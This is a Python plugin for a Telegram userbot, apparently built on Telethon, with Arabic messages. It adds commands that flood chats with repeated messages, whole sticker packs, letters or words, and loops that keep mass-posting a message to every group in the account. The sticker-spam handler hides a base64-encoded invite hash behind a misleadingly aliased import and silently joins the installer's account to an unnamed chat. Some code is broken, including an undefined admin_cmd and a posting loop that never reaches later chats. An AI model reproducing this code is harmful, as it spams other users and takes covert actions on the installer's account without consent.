# By Mawada 2021-2023
import asyncio
import base64
import re
from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from Mawada import Adyan
from telethon import events
from ..Config import Config
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.tools import media_type
from ..helpers.utils import _catutils
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import BOTLOG, BOTLOG_CHATID
yaAli = False
client = Adyan
Mukrr = Config.MUKRR_ET or "مكرر"
async def spam_function(event, Mawada, Adyan, sleeptimem, sleeptimet, DelaySpam=False):

    counter = int(Adyan[0])
    if len(Adyan) == 2:
        spam_message = str(Adyan[1])
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            if event.reply_to_msg_id:
                await Mawada.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and Mawada.media:
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            Mawada = await event.client.send_file(
                event.chat_id, Mawada, caption=Mawada.text
            )
            await _catutils.unsavegif(event, Mawada)
            await asyncio.sleep(sleeptimem)
        if BOTLOG:
            if DelaySpam is not True:
                if event.is_private:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "**⌔∮ التڪرار  **\n"
                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه**",
                    )
                else:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "**⌔∮ التڪرار  **\n"
                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه**",
                    )
            elif event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التكرار الوقتي **\n"
                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التكرار الوقتي **\n"
                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
                )

            Mawada = await event.client.send_file(BOTLOG_CHATID, Mawada)
            await _catutils.unsavegif(event, Mawada)
        return
    elif event.reply_to_msg_id and Mawada.text:
        spam_message = Mawada.text
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    else:
        return
    if DelaySpam is not True:
        if BOTLOG:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التڪرار  **\n"
                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **رسائل ال   :** \n"
                    + f"⌔∮ `{spam_message}`",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التڪرار  **\n"
                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {counter} **رسائل الـ   :** \n"
                    + f"⌔∮ `{spam_message}`",
                )
    elif BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ التكرار الوقتي **\n"
                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {sleeptimet} seconds and with {counter} **رسائل الـ   :** \n"
                + f"⌔∮ `{spam_message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ التكرار الوقتي **\n"
                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {sleeptimet} **الثواني و مع** {counter} **رسائل الـ  ️ :** \n"
                + f"⌔∮ `{spam_message}`",
            )


@Adyan.ar_cmd(pattern="كرر (.*)")
async def spammer(event):
    Mawada = await event.get_reply_message()
    Adyan = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    try:
        counter = int(Adyan[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجي استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, Mawada, Adyan, sleeptimem, sleeptimet)

@Adyan.on(admin_cmd(pattern=f"{Mukrr}"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    try:
        sleeptimet = sleeptimem = int(input_str[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    Adyan = input_str[1:]
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, reply, Adyan, sleeptimem, sleeptimet, DelaySpam=True)


@Adyan.ar_cmd(pattern="تكرار الملصق$")
async def stickerpack_spam(event):
    reply = await event.get_reply_message()
    if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
        return await edit_delete(
            event, "**⌔∮ قم بالردّ على أيّ ملصق لإرسال جميع ملصقات الحزمة  **"
        )
    hmm = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
    try:
        stickerset_attr = reply.document.attributes[1]
        catevent = await edit_or_reply(
            event, "**⌔∮ جاري إحضار تفاصيل حزمة الملصقات، يرجى الإنتظار قليلا  ⏱**"
        )
    except BaseException:
        await edit_delete(
            event,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
            5,
        )
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                )
            )
        )
    except Exception:
        return await edit_delete(
            catevent,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
        )
    try:
        hmm = Get(hmm)
        await event.client(hmm)
    except BaseException:
        pass
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            )
        )
    )
    addgvar("spamwork", True)
    for m in reqd_sticker_set.documents:
        if gvarstatus("spamwork") is None:
            return
        await event.client.send_file(event.chat_id, m)
        await asyncio.sleep(0.7)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار الملصق :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في  :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع الحزمة **",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار الملصق :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع الحزمة **",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@Adyan.ar_cmd(pattern="سبام (.*)")
async def tmeme(event):
    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await event.delete()
    addgvar("spamwork", True)
    for letter in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالحرف 📝 :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** [User](tg://user?id={event.chat_id}) **الدردشة مع** : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالحرف 📝 :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** : `{message}`",
            )


@Adyan.ar_cmd(pattern="وسبام (.*)")
async def tmeme(event):
    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await event.delete()
    addgvar("spamwork", True)
    for word in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالكلمه : **\n"
                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع :** `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالكلمه : **\n"
                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع :** `{message}`",
            )


@Adyan.ar_cmd(pattern="ايقاف التكرار ?(.*)")
async def stopspamrz(event):
    if gvarstatus("spamwork") is not None and gvarstatus("spamwork") == "true":
        delgvar("spamwork")
        return await edit_delete(event, "**⌔∮ تم بنجاح ايقاف التكرار **")
    return await edit_delete(event, "**⌔∮ عذرا لم يتم تفعيل التكرار بالاصل**")
#جميع الاكواد ادناه تمت كتابتها من قبل مطورين مصطفى ممنوع السرقة !
async def Mustafa_nshr(Adyan, sleeptimet, chat, message, seconds):
    global yaAli
    yaAli = True
    while yaAli:
        if message.media:
            sent_message = await Adyan.send_file(chat, message.media, caption=message.text)
        else:
            sent_message = await Adyan.send_message(chat, message.text)
        await asyncio.sleep(sleeptimet)
@Adyan.ar_cmd(pattern="نشر")
async def Hussein(event):
    await event.delete()
    parameters = re.split(r'\s+', event.text.strip(), maxsplit=2)
    if len(parameters) != 3:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    seconds = int(parameters[1])
    chat_usernames = parameters[2].split()
    Adyan = event.client
    global yaAli
    yaAli = True
    message = await event.get_reply_message()
    for chat_username in chat_usernames:
        try:
            chat = await Adyan.get_entity(chat_username)
            await Mustafa_nshr(Adyan, seconds, chat.id, message, seconds)  # تمرير قيمة seconds هنا لكل مجموعة
        except Exception as e:
            await edit_delete(
                event, f"⌔∮ لا يمكن العثور على المجموعة أو الدردشة {chat_username}: {str(e)}"
            )
        await asyncio.sleep(1)
    
async def Mustafa_allnshr(Adyan, sleeptimet, message):
    global yaAli
    yaAli = True
    Mustafa_chats = await Adyan.get_dialogs()
    while yaAli:
        for chat in Mustafa_chats:
            if chat.is_group:
                if chat.title != "فريق مصطفى •Team Mustafa":
                    try:
                        if message.media:
                            await Adyan.send_file(chat.id, message.media, caption=message.text)
                        else:
                            await Adyan.send_message(chat.id, message.text)
                    except Exception as e:
                        print(f"Error in sending message to chat {chat.id}: {e}")
        await asyncio.sleep(sleeptimet)

@Adyan.ar_cmd(pattern="نشر_كروبات")
async def Hussein(event):
    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    Adyan = event.client
    global yaAli
    yaAli = True
    await Mustafa_allnshr(Adyan, sleeptimet, message)
super_groups = ["super", "سوبر"]
async def Mustafa_supernshr(Adyan, sleeptimet, message):
    global yaAli
    yaAli = True
    Mustafa_chats = await Adyan.get_dialogs()
    while yaAli:
        for chat in Mustafa_chats:
            chat_title_lower = chat.title.lower()
            if chat.is_group and any(keyword in chat_title_lower for keyword in super_groups):
                try:
                    if message.media:
                        await Adyan.send_file(chat.id, message.media, caption=message.text)
                    else:
                        await Adyan.send_message(chat.id, message.text)
                except Exception as e:
                    print(f"Error in sending message to chat {chat.id}: {e}")
        await asyncio.sleep(sleeptimet)
@Adyan.ar_cmd(pattern="سوبر")
async def Hussein(event):
    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    Adyan = event.client
    global yaAli
    yaAli = True
    await Mustafa_supernshr(Adyan, sleeptimet, message)
@Adyan.ar_cmd(pattern="ايقاف (النشر|نشر)")
async def stop_Mustafa(event):
    global yaAli
    yaAli = False
    await event.edit("**᯽︙ تم ايقاف النشر التلقائي بنجاح ✓** ")
